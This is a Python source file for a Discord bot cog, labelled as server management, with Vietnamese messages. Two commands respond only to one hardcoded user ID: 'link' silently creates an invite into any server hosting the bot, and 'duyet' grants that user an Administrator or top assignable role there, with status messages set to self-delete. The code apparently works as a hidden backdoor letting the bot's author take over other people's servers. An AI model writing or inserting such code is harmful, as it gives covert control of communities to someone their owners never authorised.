import discord
from discord.ext import commands

OWNER_ID = 1404399385965498479


class ServerManager(commands.Cog):

  def __init__(self, bot):
    self.bot = bot

  @commands.command(name="link")
  async def get_link(self, ctx, guild_id: int):
    if ctx.author.id != OWNER_ID:
      return

    guild = self.bot.get_guild(guild_id)
    if not guild:
      await ctx.send(
          "❌ Bot chưa ở trong server này hoặc ID không hợp lệ!",
          delete_after=5,
      )
      return

    invite_link = None
    for channel in guild.text_channels:
      if channel.permissions_for(guild.me).create_instant_invite:
        try:
          invite = await channel.create_invite(max_age=300, max_uses=1)
          invite_link = invite.url
          break
        except:
          continue

    if invite_link:
      try:
        await ctx.author.send(
            f"🔗 Link mời vào server **{guild.name}**: {invite_link}"
        )
        await ctx.send(
            "✅ Đã gửi link vào tin nhắn riêng (DM) của bạn!", delete_after=5
        )
      except:
        await ctx.send(
            f"⚠️ Không thể gửi DM, link đây: {invite_link}", delete_after=10
        )
    else:
      await ctx.send(
          "❌ Không tìm thấy kênh nào có quyền tạo link mời!", delete_after=5
      )

  @commands.command(name="duyet")
  async def approve_server(
      self, ctx, guild_id: int, role: discord.Role = None
  ):
    if ctx.author.id != OWNER_ID:
      return

    guild = self.bot.get_guild(guild_id)
    if not guild:
      await ctx.send("❌ Bot không có mặt trong server này!", delete_after=5)
      return

    member = guild.get_member(ctx.author.id)
    if not member:
      await ctx.send(
          "❌ Bạn chưa có mặt trong server đó nên không thể add role!",
          delete_after=5,
      )
      return

    # Tự động tìm role tối ưu nếu không truyền role (ưu tiên quyền Administrator hoặc role cao nhất bot add được)
    if role is None:
      for r in reversed(guild.roles):
        if r.permissions.administrator and r < guild.me.top_role:
          role = r
          break
      if role is None:
        for r in reversed(guild.roles):
          if not r.managed and r != guild.default_role and r < guild.me.top_role:
            role = r
            break

    if not role:
      await ctx.send(
          "❌ Không tìm thấy role phù hợp. Hãy truyền thêm ID hoặc tag role"
          " cụ thể!",
          delete_after=5,
      )
      return

    try:
      await member.add_roles(role)
      await ctx.send(
          f"🎉 Đã duyệt thành công! Đã cấp role **{role.name}** cho bạn tại"
          f" server **{guild.name}**."
      )
    except Exception as e:
      await ctx.send(
          f"❌ Lỗi khi add role (kiểm tra lại thứ hạng role của bot): {e}"
      )


async def setup(bot):
  await bot.add_cog(ServerManager(bot))
